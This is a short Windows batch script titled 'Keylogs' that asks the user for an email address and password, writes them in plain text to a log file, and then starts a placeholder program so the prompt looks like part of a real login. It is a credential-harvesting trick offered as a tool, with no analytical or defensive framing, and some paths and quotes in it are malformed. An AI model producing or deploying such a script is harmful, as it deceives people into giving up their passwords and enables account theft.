@echo off
color a
title Keylogs
cls
echo Please Enter Your Email Address And Password
echo.
echo.
cd “C:Logs”
set /p user=Username:
set /p pass=Password:
echo Username=”%user%” Password=”%pass%” >> Log.txt
start >>Program Here<<
exit

